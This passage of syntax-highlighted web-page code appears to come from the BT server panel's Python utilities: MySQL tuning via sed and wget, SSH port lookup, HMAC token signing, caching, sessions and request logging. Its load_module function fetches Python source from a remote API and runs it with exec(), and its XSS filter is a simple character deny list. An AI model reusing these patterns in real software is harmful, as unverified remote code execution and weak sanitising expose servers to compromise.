&quot;s#^innodb_buffer_pool_size.*#innodb_buffer_pool_size = 1024M#&quot; /etc/my.cnf</span></span><br><span class="line"><span class="string">        sed -i &quot;s#^innodb_log_file_size.*#innodb_log_file_size = 256M#&quot; /etc/my.cnf</span></span><br><span class="line"><span class="string">    elif [[ $&#123;MemTotal&#125; -ge 16384 &amp;&amp; $&#123;MemTotal&#125; -lt 32768 ]]; then</span></span><br><span class="line"><span class="string">        sed -i &quot;s#^key_buffer_size.*#key_buffer_size = 512M#&quot; /etc/my.cnf</span></span><br><span class="line"><span class="string">        sed -i &quot;s#^table_open_cache.*#table_open_cache = 2048#&quot; /etc/my.cnf</span></span><br><span class="line"><span class="string">        sed -i &quot;s#^sort_buffer_size.*#sort_buffer_size = 8M#&quot; /etc/my.cnf</span></span><br><span class="line"><span class="string">        sed -i &quot;s#^read_buffer_size.*#read_buffer_size = 8M#&quot; /etc/my.cnf</span></span><br><span class="line"><span class="string">        sed -i &quot;s#^myisam_sort_buffer_size.*#myisam_sort_buffer_size = 128M#&quot; /etc/my.cnf</span></span><br><span class="line"><span class="string">        sed -i &quot;s#^thread_cache_size.*#thread_cache_size = 256#&quot; /etc/my.cnf</span></span><br><span class="line"><span class="string">        sed -i &quot;s#^query_cache_size.*#query_cache_size = 256M#&quot; /etc/my.cnf</span></span><br><span class="line"><span class="string">        sed -i &quot;s#^tmp_table_size.*#tmp_table_size = 256M#&quot; /etc/my.cnf</span></span><br><span class="line"><span class="string">        sed -i &quot;s#^innodb_buffer_pool_size.*#innodb_buffer_pool_size = 2048M#&quot; /etc/my.cnf</span></span><br><span class="line"><span class="string">        sed -i &quot;s#^innodb_log_file_size.*#innodb_log_file_size = 512M#&quot; /etc/my.cnf</span></span><br><span class="line"><span class="string">    elif [[ $&#123;MemTotal&#125; -ge 32768 ]]; then</span></span><br><span class="line"><span class="string">        sed -i &quot;s#^key_buffer_size.*#key_buffer_size = 1024M#&quot; /etc/my.cnf</span></span><br><span class="line"><span class="string">        sed -i &quot;s#^table_open_cache.*#table_open_cache = 4096#&quot; /etc/my.cnf</span></span><br><span class="line"><span class="string">        sed -i &quot;s#^sort_buffer_size.*#sort_buffer_size = 16M#&quot; /etc/my.cnf</span></span><br><span class="line"><span class="string">        sed -i &quot;s#^read_buffer_size.*#read_buffer_size = 16M#&quot; /etc/my.cnf</span></span><br><span class="line"><span class="string">        sed -i &quot;s#^myisam_sort_buffer_size.*#myisam_sort_buffer_size = 256M#&quot; /etc/my.cnf</span></span><br><span class="line"><span class="string">        sed -i &quot;s#^thread_cache_size.*#thread_cache_size = 512#&quot; /etc/my.cnf</span></span><br><span class="line"><span class="string">        sed -i &quot;s#^query_cache_size.*#query_cache_size = 512M#&quot; /etc/my.cnf</span></span><br><span class="line"><span class="string">        sed -i &quot;s#^tmp_table_size.*#tmp_table_size = 512M#&quot; /etc/my.cnf</span></span><br><span class="line"><span class="string">        sed -i &quot;s#^innodb_buffer_pool_size.*#innodb_buffer_pool_size = 4096M#&quot; /etc/my.cnf</span></span><br><span class="line"><span class="string">        sed -i &quot;s#^innodb_log_file_size.*#innodb_log_file_size = 1024M#&quot; /etc/my.cnf</span></span><br><span class="line"><span class="string">    fi</span></span><br><span class="line"><span class="string">&#125;</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">wget -O /etc/my.cnf $Download_Url/install/conf/mysql-%s.conf -T 5</span></span><br><span class="line"><span class="string">chmod 644 /etc/my.cnf</span></span><br><span class="line"><span class="string">MySQL_Opt</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span> % (version,)</span><br><span class="line">    ExecShell(shellStr)</span><br><span class="line">    <span class="comment">#判断是否迁移目录</span></span><br><span class="line">    <span class="keyword">if</span> os.path.exists(<span class="string">&#x27;data/datadir.pl&#x27;</span>):</span><br><span class="line">        newPath = readFile(<span class="string">&#x27;data/datadir.pl&#x27;</span>)</span><br><span class="line">        <span class="keyword">if</span> os.path.exists(newPath):</span><br><span class="line">            mycnf = readFile(<span class="string">&#x27;/etc/my.cnf&#x27;</span>)</span><br><span class="line">            mycnf = mycnf.replace(<span class="string">&#x27;/www/server/data&#x27;</span>,newPath)</span><br><span class="line">            writeFile(<span class="string">&#x27;/etc/my.cnf&#x27;</span>,mycnf)</span><br><span class="line">    WriteLog(<span class="string">&#x27;TYPE_SOFE&#x27;</span>, <span class="string">&#x27;MYSQL_CHECK_ERR&#x27;</span>)</span><br><span class="line">    <span class="keyword">return</span> <span class="literal">True</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">GetSSHPort</span>():</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        file = <span class="string">&#x27;/etc/ssh/sshd_config&#x27;</span></span><br><span class="line">        conf = ReadFile(file)</span><br><span class="line">        rep = <span class="string">&quot;#*Port\s+([0-9]+)\s*\n&quot;</span></span><br><span class="line">        port = re.search(rep,conf).groups(<span class="number">0</span>)[<span class="number">0</span>]</span><br><span class="line">        <span class="keyword">return</span> <span class="built_in">int</span>(port)</span><br><span class="line">    <span class="keyword">except</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="number">22</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">GetSSHStatus</span>():</span><br><span class="line">    <span class="keyword">if</span> os.path.exists(<span class="string">&#x27;/usr/bin/apt-get&#x27;</span>):</span><br><span class="line">             status = ExecShell(<span class="string">&quot;service ssh status | grep -P &#x27;(dead|stop)&#x27;&quot;</span>)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">import</span> system</span><br><span class="line">        panelsys = system.system()</span><br><span class="line">        version = panelsys.GetSystemVersion()</span><br><span class="line">        <span class="keyword">if</span> version.find(<span class="string">&#x27; 7.&#x27;</span>) != -<span class="number">1</span>:</span><br><span class="line">            status = ExecShell(<span class="string">&quot;systemctl status sshd.service | grep &#x27;dead&#x27;&quot;</span>)</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            status = ExecShell(<span class="string">&quot;/etc/init.d/sshd status | grep -e &#x27;stopped&#x27; -e &#x27;已停&#x27;&quot;</span>)</span><br><span class="line">    <span class="keyword">if</span> <span class="built_in">len</span>(status[<span class="number">0</span>]) &gt; <span class="number">3</span>:</span><br><span class="line">        status = <span class="literal">False</span></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        status = <span class="literal">True</span></span><br><span class="line">    <span class="keyword">return</span> status</span><br><span class="line"></span><br><span class="line"><span class="comment">#检查端口是否合法</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">CheckPort</span>(<span class="params">port,other=<span class="literal">None</span></span>):</span><br><span class="line">    <span class="keyword">if</span> <span class="built_in">type</span>(port) == <span class="built_in">str</span>: port = <span class="built_in">int</span>(port)</span><br><span class="line">    <span class="keyword">if</span> port &lt; <span class="number">1</span> <span class="keyword">or</span> port &gt; <span class="number">65535</span>: <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line">    <span class="keyword">if</span> other:</span><br><span class="line">        checks = [<span class="number">22</span>,<span class="number">20</span>,<span class="number">21</span>,<span class="number">8888</span>,<span class="number">3306</span>,<span class="number">11211</span>,<span class="number">888</span>,<span class="number">25</span>]</span><br><span class="line">        <span class="keyword">if</span> port <span class="keyword">in</span> checks: <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line">    <span class="keyword">return</span> <span class="literal">True</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#获取Token</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">GetToken</span>():</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        <span class="keyword">from</span> json <span class="keyword">import</span> loads</span><br><span class="line">        tokenFile = <span class="string">&#x27;data/token.json&#x27;</span></span><br><span class="line">        <span class="keyword">if</span> <span class="keyword">not</span> os.path.exists(tokenFile): <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line">        token = loads(readFile(tokenFile))</span><br><span class="line">        <span class="keyword">return</span> token</span><br><span class="line">    <span class="keyword">except</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">to_btint</span>(<span class="params">string</span>):</span><br><span class="line">    m_list = []</span><br><span class="line">    <span class="keyword">for</span> s <span class="keyword">in</span> string:</span><br><span class="line">        m_list.append(<span class="built_in">ord</span>(s))</span><br><span class="line">    <span class="keyword">return</span> m_list</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">load_module</span>(<span class="params">pluginCode</span>):</span><br><span class="line">    <span class="keyword">from</span> imp <span class="keyword">import</span> new_module</span><br><span class="line">    <span class="keyword">from</span> BTPanel <span class="keyword">import</span> cache</span><br><span class="line">    p_tk = <span class="string">&#x27;data/%s&#x27;</span> % md5(pluginCode + get_uuid())</span><br><span class="line">    pluginInfo = <span class="literal">None</span></span><br><span class="line">    <span class="keyword">if</span> cache: pluginInfo = cache.get(pluginCode+<span class="string">&#x27;code&#x27;</span>)</span><br><span class="line">    <span class="keyword">if</span> <span class="keyword">not</span> pluginInfo:</span><br><span class="line">        <span class="keyword">import</span> panelAuth</span><br><span class="line">        pdata = panelAuth.panelAuth().create_serverid(<span class="literal">None</span>)</span><br><span class="line">        pdata[<span class="string">&#x27;pid&#x27;</span>] = pluginCode</span><br><span class="line">        url = GetConfigValue(<span class="string">&#x27;home&#x27;</span>) + <span class="string">&#x27;/api/panel/get_py_module&#x27;</span></span><br><span class="line">        pluginTmp = httpPost(url,pdata)</span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            pluginInfo = json.loads(pluginTmp)</span><br><span class="line">        <span class="keyword">except</span>:</span><br><span class="line">            <span class="keyword">if</span> <span class="keyword">not</span> os.path.exists(p_tk): <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line">            pluginInfo = json.loads(ReadFile(p_tk))</span><br><span class="line">        <span class="keyword">if</span> pluginInfo[<span class="string">&#x27;status&#x27;</span>] == <span class="literal">False</span>: <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line">        WriteFile(p_tk,json.dumps(pluginInfo))</span><br><span class="line">        os.chmod(p_tk,<span class="number">384</span>)</span><br><span class="line">        <span class="keyword">if</span> cache: cache.<span class="built_in">set</span>(pluginCode+<span class="string">&#x27;code&#x27;</span>,pluginInfo,<span class="number">1800</span>)</span><br><span class="line"></span><br><span class="line">    mod = sys.modules.setdefault(pluginCode, new_module(pluginCode))</span><br><span class="line">    code = <span class="built_in">compile</span>(pluginInfo[<span class="string">&#x27;msg&#x27;</span>].encode(<span class="string">&#x27;utf-8&#x27;</span>),pluginCode, <span class="string">&#x27;exec&#x27;</span>)</span><br><span class="line">    mod.__file__ = pluginCode</span><br><span class="line">    mod.__package__ = <span class="string">&#x27;&#x27;</span></span><br><span class="line">    <span class="built_in">exec</span>(code, mod.__dict__)</span><br><span class="line">    <span class="keyword">return</span> mod</span><br><span class="line"></span><br><span class="line"><span class="comment">#解密数据</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">auth_decode</span>(<span class="params">data</span>):</span><br><span class="line">    token = GetToken()</span><br><span class="line">    <span class="comment">#是否有生成Token</span></span><br><span class="line">    <span class="keyword">if</span> <span class="keyword">not</span> token: <span class="keyword">return</span> returnMsg(<span class="literal">False</span>,<span class="string">&#x27;REQUEST_ERR&#x27;</span>)</span><br><span class="line"></span><br><span class="line">    <span class="comment">#校验access_key是否正确</span></span><br><span class="line">    <span class="keyword">if</span> token[<span class="string">&#x27;access_key&#x27;</span>] != data[<span class="string">&#x27;btauth_key&#x27;</span>]: <span class="keyword">return</span> returnMsg(<span class="literal">False</span>,<span class="string">&#x27;REQUEST_ERR&#x27;</span>)</span><br><span class="line"></span><br><span class="line">    <span class="comment">#解码数据</span></span><br><span class="line">    <span class="keyword">import</span> binascii,hashlib,urllib,hmac,json</span><br><span class="line">    tdata = binascii.unhexlify(data[<span class="string">&#x27;data&#x27;</span>])</span><br><span class="line"></span><br><span class="line">    <span class="comment">#校验signature是否正确</span></span><br><span class="line">    signature = binascii.hexlify(hmac.new(token[<span class="string">&#x27;secret_key&#x27;</span>], tdata, digestmod=hashlib.sha256).digest())</span><br><span class="line">    <span class="keyword">if</span> signature != data[<span class="string">&#x27;signature&#x27;</span>]: <span class="keyword">return</span> returnMsg(<span class="literal">False</span>,<span class="string">&#x27;REQUEST_ERR&#x27;</span>)</span><br><span class="line"></span><br><span class="line">    <span class="comment">#返回</span></span><br><span class="line">    <span class="keyword">return</span> json.loads(urllib.unquote(tdata))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">#数据加密</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">auth_encode</span>(<span class="params">data</span>):</span><br><span class="line">    token = GetToken()</span><br><span class="line">    pdata = &#123;&#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">#是否有生成Token</span></span><br><span class="line">    <span class="keyword">if</span> <span class="keyword">not</span> token: <span class="keyword">return</span> returnMsg(<span class="literal">False</span>,<span class="string">&#x27;REQUEST_ERR&#x27;</span>)</span><br><span class="line"></span><br><span class="line">    <span class="comment">#生成signature</span></span><br><span class="line">    <span class="keyword">import</span> binascii,hashlib,urllib,hmac,json</span><br><span class="line">    tdata = urllib.quote(json.dumps(data))</span><br><span class="line">    <span class="comment">#公式  hex(hmac_sha256(data))</span></span><br><span class="line">    pdata[<span class="string">&#x27;signature&#x27;</span>] = binascii.hexlify(hmac.new(token[<span class="string">&#x27;secret_key&#x27;</span>], tdata, digestmod=hashlib.sha256).digest())</span><br><span class="line"></span><br><span class="line">    <span class="comment">#加密数据</span></span><br><span class="line">    pdata[<span class="string">&#x27;btauth_key&#x27;</span>] = token[<span class="string">&#x27;access_key&#x27;</span>]</span><br><span class="line">    pdata[<span class="string">&#x27;data&#x27;</span>] = binascii.hexlify(tdata)</span><br><span class="line">    pdata[<span class="string">&#x27;timestamp&#x27;</span>] = time.time()</span><br><span class="line"></span><br><span class="line">    <span class="comment">#返回</span></span><br><span class="line">    <span class="keyword">return</span> pdata</span><br><span class="line"></span><br><span class="line"><span class="comment">#检查Token</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">checkToken</span>(<span class="params">get</span>):</span><br><span class="line">    tempFile = <span class="string">&#x27;data/tempToken.json&#x27;</span></span><br><span class="line">    <span class="keyword">if</span> <span class="keyword">not</span> os.path.exists(tempFile): <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line">    <span class="keyword">import</span> json,time</span><br><span class="line">    tempToken = json.loads(readFile(tempFile))</span><br><span class="line">    <span class="keyword">if</span> time.time() &gt; tempToken[<span class="string">&#x27;timeout&#x27;</span>]: <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line">    <span class="keyword">if</span> get.token != tempToken[<span class="string">&#x27;token&#x27;</span>]: <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line">    <span class="keyword">return</span> <span class="literal">True</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#获取识别码</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">get_uuid</span>():</span><br><span class="line">    <span class="keyword">import</span> uuid</span><br><span class="line">    <span class="keyword">return</span> uuid.UUID(<span class="built_in">int</span>=uuid.getnode()).<span class="built_in">hex</span>[-<span class="number">12</span>:]</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">#进程是否存在</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">process_exists</span>(<span class="params">pname,exe = <span class="literal">None</span>,cmdline = <span class="literal">None</span></span>):</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        <span class="keyword">import</span> psutil</span><br><span class="line">        pids = psutil.pids()</span><br><span class="line">        <span class="keyword">for</span> pid <span class="keyword">in</span> pids:</span><br><span class="line">            <span class="keyword">try</span>:</span><br><span class="line">                p = psutil.Process(pid)</span><br><span class="line">                <span class="keyword">if</span> p.name() == pname:</span><br><span class="line">                    <span class="keyword">if</span> <span class="keyword">not</span> exe <span class="keyword">and</span> <span class="keyword">not</span> cmdline:</span><br><span class="line">                        <span class="keyword">return</span> <span class="literal">True</span></span><br><span class="line">                    <span class="keyword">else</span>:</span><br><span class="line">                        <span class="keyword">if</span> exe:</span><br><span class="line">                            <span class="keyword">if</span> p.exe() == exe: <span class="keyword">return</span> <span class="literal">True</span></span><br><span class="line">                        <span class="keyword">if</span> cmdline:</span><br><span class="line">                            <span class="keyword">if</span> cmdline <span class="keyword">in</span>  p.cmdline(): <span class="keyword">return</span> <span class="literal">True</span></span><br><span class="line">            <span class="keyword">except</span>:<span class="keyword">pass</span></span><br><span class="line">        <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line">    <span class="keyword">except</span>: <span class="keyword">return</span> <span class="literal">True</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">#重启面板</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">restart_panel</span>():</span><br><span class="line">    <span class="keyword">import</span> system</span><br><span class="line">    <span class="keyword">return</span> system.system().ReWeb(<span class="literal">None</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment">#获取mac</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">get_mac_address</span>():</span><br><span class="line">    <span class="keyword">import</span> uuid</span><br><span class="line">    mac=uuid.UUID(<span class="built_in">int</span> = uuid.getnode()).<span class="built_in">hex</span>[-<span class="number">12</span>:]</span><br><span class="line">    <span class="keyword">return</span> <span class="string">&quot;:&quot;</span>.join([mac[e:e+<span class="number">2</span>] <span class="keyword">for</span> e <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>,<span class="number">11</span>,<span class="number">2</span>)])</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">#转码</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">to_string</span>(<span class="params">lites</span>):</span><br><span class="line">    <span class="keyword">if</span> <span class="built_in">type</span>(lites) != <span class="built_in">list</span>: lites = [lites]</span><br><span class="line">    m_str = <span class="string">&#x27;&#x27;</span></span><br><span class="line">    <span class="keyword">for</span> mu <span class="keyword">in</span> lites:</span><br><span class="line">        <span class="keyword">if</span> sys.version_info[<span class="number">0</span>] == <span class="number">2</span>:</span><br><span class="line">            m_str += unichr(mu).encode(<span class="string">&#x27;utf-8&#x27;</span>)</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            m_str += <span class="built_in">chr</span>(mu)</span><br><span class="line">    <span class="keyword">return</span> m_str</span><br><span class="line"></span><br><span class="line"><span class="comment">#解码</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">to_ord</span>(<span class="params">string</span>):</span><br><span class="line">    o  = []</span><br><span class="line">    <span class="keyword">for</span> s <span class="keyword">in</span> string:</span><br><span class="line">        o.append(<span class="built_in">ord</span>(s))</span><br><span class="line">    <span class="keyword">return</span> o</span><br><span class="line"></span><br><span class="line"><span class="comment">#xss 防御</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">xssencode</span>(<span class="params">text</span>):</span><br><span class="line">    <span class="keyword">import</span> cgi</span><br><span class="line">    <span class="built_in">list</span>=[<span class="string">&#x27;`&#x27;</span>,<span class="string">&#x27;~&#x27;</span>,<span class="string">&#x27;&amp;&#x27;</span>,<span class="string">&#x27;#&#x27;</span>,<span class="string">&#x27;/&#x27;</span>,<span class="string">&#x27;*&#x27;</span>,<span class="string">&#x27;$&#x27;</span>,<span class="string">&#x27;@&#x27;</span>,<span class="string">&#x27;&lt;&#x27;</span>,<span class="string">&#x27;&gt;&#x27;</span>,<span class="string">&#x27;\&quot;&#x27;</span>,<span class="string">&#x27;\&#x27;&#x27;</span>,<span class="string">&#x27;;&#x27;</span>,<span class="string">&#x27;%&#x27;</span>,<span class="string">&#x27;,&#x27;</span>,<span class="string">&#x27;.&#x27;</span>,<span class="string">&#x27;\\u&#x27;</span>]</span><br><span class="line">    ret=[]</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> text:</span><br><span class="line">        <span class="keyword">if</span> i <span class="keyword">in</span> <span class="built_in">list</span>:</span><br><span class="line">            i=<span class="string">&#x27;&#x27;</span></span><br><span class="line">        ret.append(i)</span><br><span class="line">    str_convert = <span class="string">&#x27;&#x27;</span>.join(ret)</span><br><span class="line">    text2=cgi.escape(str_convert, quote=<span class="literal">True</span>)</span><br><span class="line">    <span class="keyword">return</span> text2</span><br><span class="line"></span><br><span class="line"><span class="comment"># 取缓存</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">cache_get</span>(<span class="params">key</span>):</span><br><span class="line">    <span class="keyword">from</span> BTPanel <span class="keyword">import</span> cache</span><br><span class="line">    <span class="keyword">return</span> cache.get(key)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 设置缓存</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">cache_set</span>(<span class="params">key,value,timeout = <span class="literal">None</span></span>):</span><br><span class="line">    <span class="keyword">from</span> BTPanel <span class="keyword">import</span> cache</span><br><span class="line">    <span class="keyword">return</span> cache.<span class="built_in">set</span>(key,value,timeout)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 删除缓存</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">cache_remove</span>(<span class="params">key</span>):</span><br><span class="line">    <span class="keyword">from</span> BTPanel <span class="keyword">import</span> cache</span><br><span class="line">    <span class="keyword">return</span> cache.delete(key)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 取session值</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">sess_get</span>(<span class="params">key</span>):</span><br><span class="line">    <span class="keyword">from</span> BTPanel <span class="keyword">import</span> session</span><br><span class="line">    <span class="keyword">if</span> key <span class="keyword">in</span> session: <span class="keyword">return</span> session[key]</span><br><span class="line">    <span class="keyword">return</span> <span class="literal">None</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 设置或修改session值</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">sess_set</span>(<span class="params">key,value</span>):</span><br><span class="line">    <span class="keyword">from</span> BTPanel <span class="keyword">import</span> session</span><br><span class="line">    session[key] = value</span><br><span class="line">    <span class="keyword">return</span> <span class="literal">True</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 删除指定session值</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">sess_remove</span>(<span class="params">key</span>):</span><br><span class="line">    <span class="keyword">from</span> BTPanel <span class="keyword">import</span> session</span><br><span class="line">    <span class="keyword">if</span> key <span class="keyword">in</span> session: <span class="keyword">del</span>(session[key])</span><br><span class="line">    <span class="keyword">return</span> <span class="literal">True</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 构造分页</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">get_page</span>(<span class="params">count,p=<span class="number">1</span>,rows=<span class="number">12</span>,callback=<span class="string">&#x27;&#x27;</span>,result=<span class="string">&#x27;1,2,3,4,5,8&#x27;</span></span>):</span><br><span class="line">    <span class="keyword">import</span> page</span><br><span class="line">    <span class="keyword">from</span> BTPanel <span class="keyword">import</span> request</span><br><span class="line">    page = page.Page()</span><br><span class="line">    info = &#123; <span class="string">&#x27;count&#x27;</span>:count,  <span class="string">&#x27;row&#x27;</span>:rows,  <span class="string">&#x27;p&#x27;</span>:p, <span class="string">&#x27;return_js&#x27;</span>:callback ,<span class="string">&#x27;uri&#x27;</span>:request.full_path&#125;</span><br><span class="line">    data = &#123; <span class="string">&#x27;page&#x27;</span>: page.GetPage(info,result),  <span class="string">&#x27;shift&#x27;</span>: <span class="built_in">str</span>(page.SHIFT), <span class="string">&#x27;row&#x27;</span>: <span class="built_in">str</span>(page.ROW) &#125;</span><br><span class="line">    <span class="keyword">return</span> data</span><br><span class="line"></span><br><span class="line"><span class="comment"># 取面板版本</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">version</span>():</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        <span class="keyword">from</span> BTPanel <span class="keyword">import</span> g</span><br><span class="line">        <span class="keyword">return</span> g.version</span><br><span class="line">    <span class="keyword">except</span>:</span><br><span class="line">        comm = ReadFile(<span class="string">&#x27;/www/server/panel/class/common.py&#x27;</span>)</span><br><span class="line">        <span class="keyword">return</span> re.search(<span class="string">&quot;g\.version\s*=\s*&#x27;(\d+\.\d+\.\d+)&#x27;&quot;</span>,comm).groups()[<span class="number">0</span>]</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">#取文件或目录大小</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">get_path_size</span>(<span class="params">path</span>):</span><br><span class="line">    <span class="keyword">if</span> <span class="keyword">not</span> os.path.exists(path): <span class="keyword">return</span> <span class="number">0</span></span><br><span class="line">    <span class="keyword">if</span> <span class="keyword">not</span> os.path.isdir(path): <span class="keyword">return</span> os.path.getsize(path)</span><br><span class="line">    size_total = <span class="number">0</span></span><br><span class="line">    <span class="keyword">for</span> nf <span class="keyword">in</span> os.walk(path):</span><br><span class="line">        <span class="keyword">for</span> f <span class="keyword">in</span> nf[<span class="number">2</span>]:</span><br><span class="line">            filename = nf[<span class="number">0</span>] + <span class="string">&#x27;/&#x27;</span> + f</span><br><span class="line">            <span class="keyword">if</span> <span class="keyword">not</span> os.path.exists(filename): <span class="keyword">continue</span></span><br><span class="line">            <span class="keyword">if</span> os.path.islink(filename): <span class="keyword">continue</span></span><br><span class="line">            size_total += os.path.getsize(filename)</span><br><span class="line">    <span class="keyword">return</span> size_total</span><br><span class="line"></span><br><span class="line"><span class="comment">#写关键请求日志</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">write_request_log</span>(<span class="params">reques = <span class="literal">None</span></span>):</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        <span class="keyword">from</span> BTPanel <span class="keyword">import</span> request,g</span><br><span class="line">        <span class="keyword">if</span> request.path <span class="keyword">in</span> [<span class="string">&#x27;/service_status&#x27;</span>,<span class="string">&#x27;/favicon.ico&#x27;</span>,<span class="string">&#x27;/task&#x27;</span>,<span class="string">&#x27;/system&#x27;</span>,<span class="string">&#x27;/ajax&#x27;</span>,<span class="string">&#x27;/control&#x27;</span>,<span class="string">&#x27;/data&#x27;</span>,<span class="string">&#x27;/ssl&#x27;</span>]:</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line"></span><br><span class="line">        log_path = <span class="string">&#x27;/www/server/panel/logs/request&#x27;</span></span><br><span class="line">        log_file = getDate(<span class="built_in">format</span>=<span class="string">&#x27;%Y-%m-%d&#x27;</span>) + <span class="string">&#x27;.json&#x27;</span></span><br><span class="line">        <span class="keyword">if</span> <span class="keyword">not</span> os.path.exists(log_path): os.makedirs(log_path)</span><br><span class="line"></span><br><span class="line">        log_data = []</span><br><span class="line">        log_data.append(getDate())</span><br><span class="line">        log_data.append(GetClientIp() + <span class="string">&#x27;:&#x27;</span> + <span class="built_in">str</span>(request.environ.get(<span class="string">&#x27;REMOTE_PORT&#x27;</span>)))</span><br><span class="line">        log_data.append(request.method)</span><br><span class="line">        log_data.append(request.full_path)</span><br><span class="line">        log_data.append(request.headers.get(<span class="string">&#x27;User-Agent&#x27;</span>))</span><br><span class="line">        <span class="keyword">if</span> request.method == <span class="string">&#x27;POST&#x27;</span>:</span><br><span class="line">            args = <span class="built_in">str</span>(request.form.to_dict())</span><br><span class="line">            <span class="keyword">if</span> <span class="built_in">len</span>(args) &lt; <span class="number">2048</span> <span class="keyword">and</span> args.find(<span class="string">&#x27;pass&#x27;</span>) == -<span class="number">1</span> <span class="keyword">and</span> args.find(<span class="string">&#x27;user&#x27;</span>) == -<span class="number">1</span>:</span><br><span class="line">                log_data.append(args)</span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                log_data.append(<span class="string">&#x27;&#123;&#125;&#x27;</span>)</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            log_data.append(<span class="string">&#x27;&#123;&#125;&#x27;</span>)</span><br><span class="line">        log_data.append(<span class="built_in">int</span>((time.time() - g.request_time) * <span class="number">1000</span>))</span><br><span class="line">        WriteFile(log_path + <span class="string">&#x27;/&#x27;</span> + log_file,json.dumps(log_data) + <span class="string">&quot;\n&quot;</span>,<span class="string">&#x27;a+&#x27;</span>)</span><br><span class="line">        rep_sys_path()</span><br><span class="line">    <span class="keyword">except</span>: <span class="keyword">pass</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#重载模块</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">mod_reload</span>(<span class="params">mode</span>):</span><br><span class="line">    <span class="keyword">if</span> <span class="keyword">not</span> mode: <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        <span class="keyword">if</span> sys.version_info[<span class="number">0</span>] == <span class="number">2</span>:</span><br><span class="line">            reload(mode)</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="keyword">import</span> imp</span><br><span class="line">            imp.reload(mode)</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">True</span></span><br><span class="line">    <span class="keyword">except</span>: <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#设置权限</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">set_mode</span>(<span class="params">filename,mode</span>):</span><br><span class="line">    <span class="keyword">if</span> <span class="keyword">not</span> os.path.exists(filename): <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line">    mode = <span class="built_in">int</span>(<span class="built_in">str</span>(mode),<span class="number">8</span>)</span><br><span class="line">    os.chmod(filename,mode)</span><br><span class="line">    <span class="keyword">return</span> <span class="literal">True</span></span><br><span 